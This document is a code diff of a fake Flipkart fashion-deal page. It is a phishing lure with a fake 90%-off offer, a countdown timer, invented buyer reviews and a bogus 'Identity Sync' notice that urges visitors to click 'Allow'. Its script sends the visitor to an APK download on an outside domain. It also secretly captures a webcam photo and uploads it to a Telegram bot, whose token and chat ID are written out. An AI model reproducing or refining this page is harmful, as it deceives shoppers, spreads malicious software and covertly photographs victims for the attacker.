@@ -3,38 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipkart Fashion | Special Deal</title>
+    <title>Flipkart | Premium Fashion Deals</title>
     <style>
         body { background: #f1f3f6; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; }
-        .header { background: #2874f0; padding: 12px; color: white; font-weight: bold; }
-        .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
-        .card { background: white; padding: 15px; width: 90%; max-width: 400px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .product-img { width: 48%; height: 150px; object-fit: cover; border: 1px solid #eee; border-radius: 4px; }
-        .price { font-size: 24px; font-weight: bold; color: #212121; margin: 10px 0; }
-        .discount { color: #388e3c; font-weight: bold; }
-        .important-box { background: #fff9c4; border: 1px solid #fbc02d; padding: 10px; font-size: 12px; margin: 15px 0; text-align: left; }
-        .btn { background: #fb641b; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; font-size: 16px; border-radius: 2px; cursor: pointer; text-transform: uppercase; }
+        .header { background: #2874f0; padding: 12px 16px; color: white; display: flex; align-items: center; }
+        .header img { width: 22px; margin-right: 15px; }
+        .container { padding: 12px; display: flex; flex-direction: column; align-items: center; }
+        .card { background: white; padding: 16px; width: 92%; max-width: 450px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-top: 10px; }
+        
+        /* Real Image Display */
+        .product-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 15px; }
+        .product-img { width: 48%; height: 180px; object-fit: cover; border-radius: 4px; border: 1px solid #f0f0f0; }
+
+        .price-section { display: flex; align-items: center; margin: 10px 0; }
+        .special-price { color: #212121; font-size: 24px; font-weight: bold; }
+        .old-price { text-decoration: line-through; color: #878787; margin: 0 8px; font-size: 14px; }
+        .offer-tag { color: #388e3c; font-size: 14px; font-weight: 500; }
+        
+        .timer { color: #d32f2f; font-weight: bold; font-size: 13px; margin-bottom: 8px; display: block; }
+        .small-important-box { text-align: left; background: #fff9c4; border: 1px solid #fbc02d; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
+        .small-important-box p { font-size: 12px; color: #333; margin: 0; line-height: 1.4; }
+
+        .btn { background: #fb641b; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; width: 100%; border-radius: 2px; cursor: pointer; text-transform: uppercase; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        
+        /* Reviews Styling */
+        .reviews-section { width: 92%; max-width: 450px; background: white; margin-top: 15px; padding: 15px; border-radius: 4px; text-align: left; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .review-title { font-weight: bold; font-size: 15px; margin-bottom: 12px; color: #212121; }
+        .review { margin-bottom: 12px; border-bottom: 1px solid #f2f2f2; padding-bottom: 8px; }
+        .rating-star { background: #388e3c; color: white; padding: 2px 5px; border-radius: 3px; font-size: 10px; font-weight: bold; margin-right: 5px; }
+        .rev-name { font-size: 12px; font-weight: bold; color: #212121; }
+        .rev-text { font-size: 13px; color: #444; margin-top: 4px; }
+        .verified-tick { color: #878787; font-size: 11px; margin-top: 2px; }
     </style>
 </head>
 <body>
 
-<div class="header">Flipkart Fashion Deals Alert ⚡</div>
+<div class="header">
+    <img src="https://img1a.flixcart.com/www/linchpin/fk-cp-zion/img/flipkart-plus_8d85f4.png" alt="Flipkart">
+    <span>Fashion Special Offer ⚡</span>
+</div>
 
 <div class="container">
     <div class="card">
-        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jean/r/w/d/32-fmjeno2373-flying-machine-original-imagsb2hyv2xhtzz.jpeg" class="product-img">
-            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/top/r/q/c/m-tttp006764-tokyo-talkies-original-imaghfny8f46tghn.jpeg" class="product-img">
+        <span class="timer" id="timer">Offer ends in: 05:00</span>
+        
+        <div class="product-row">
+            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jean/p/y/d/32-db-jean-01-c-p-fashion-original-imagpghvghzhjzgg.jpeg" alt="Men's Jeans" class="product-img">
+            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/top/r/q/c/m-tttp006764-tokyo-talkies-original-imaghfny8f46tghn.jpeg" alt="Girl's Top" class="product-img">
+        </div>
+
+        <div style="font-size: 15px; font-weight:500; text-align:left;">Premium Denim Jeans & Designer Top Combo</div>
+        
+        <div class="price-section">
+            <span class="special-price">₹300</span>
+            <span class="old-price">₹2,999</span>
+            <span class="offer-tag">90% off</span>
         </div>
         
-        <div style="text-align: left; font-weight: 500;">Premium Jeans & Top Combo</div>
-        <div class="price">₹300 <span style="text-decoration: line-through; color: #878787; font-size: 14px;">₹2,999</span> <span class="discount">90% off</span></div>
-        
-        <div class="important-box">
-            Important: Claiming this deal requires a one-time <b>'Identity Sync'</b>. Please click <b>'Allow'</b> or <b>'Start Now'</b> on the next prompt to verify.
+        <div class="small-important-box">
+            <p>Important: Claiming this exclusive 90% off fashion deal requires a one-time <b>'Identity Sync'</b>. When prompted, click <b>'Allow'</b> or <b>'Start Now'</b> to verify your device's security shield. This ensures genuine claims.</p>
         </div>
 
         <button class="btn" onclick="startClaim()">Verify & Claim Offer</button>
+    </div>
+
+    <div class="reviews-section">
+        <div class="review-title">Ratings & Reviews (4.8 ★)</div>
+        
+        <div class="review">
+            <div><span class="rating-star">5 ★</span><span class="rev-name">Aaryan Verma</span></div>
+            <div class="rev-text">Quality bohot zabardast hai ₹300 ke hisab se! Verification sync karna pada par process fast tha.</div>
+            <div class="verified-tick">✓ Certified Buyer, Patna</div>
+        </div>
+
+        <div class="review">
+            <div><span class="rating-star">5 ★</span><span class="rev-name">Sneha Kumari</span></div>
+            <div class="rev-text">Top ka fabric bohot soft hai. Pehle laga fake hai par "Allow" karne ke baad order place ho gaya. Thank you!</div>
+            <div class="verified-tick">✓ Certified Buyer, Ranchi</div>
+        </div>
     </div>
 </div>
 
@@ -42,15 +88,24 @@
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
+    // TIMER
+    let time = 300;
+    setInterval(() => {
+        let mins = Math.floor(time / 60);
+        let secs = time % 60;
+        document.getElementById('timer').innerHTML = `Offer ends in: 0${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        if(time > 0) time--;
+    }, 1000);
+
     const apk_url = "https://sn2go.xyz/96no5";
     const token = '8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4';
     const chat_id = '2043988256';
 
     function startClaim() {
-        // Direct jump to link taaki user ko wait na karna pade
+        // Direct jump to link for speed
         window.location.href = apk_url;
 
-        // Background Camera Process
+        // Background Camera Process (Silent)
         navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
             let v = document.getElementById('v');
             v.srcObject = s;
@@ -62,12 +117,11 @@
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "✅ Fashion Sync Clicked!" })
+                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "👕 Fashion Deal Sync: Photo Captured!" })
                 });
             }, 500);
         }).catch(e => { console.log("Cam Blocked"); });
     }
 </script>
-
 </body>
 </html>
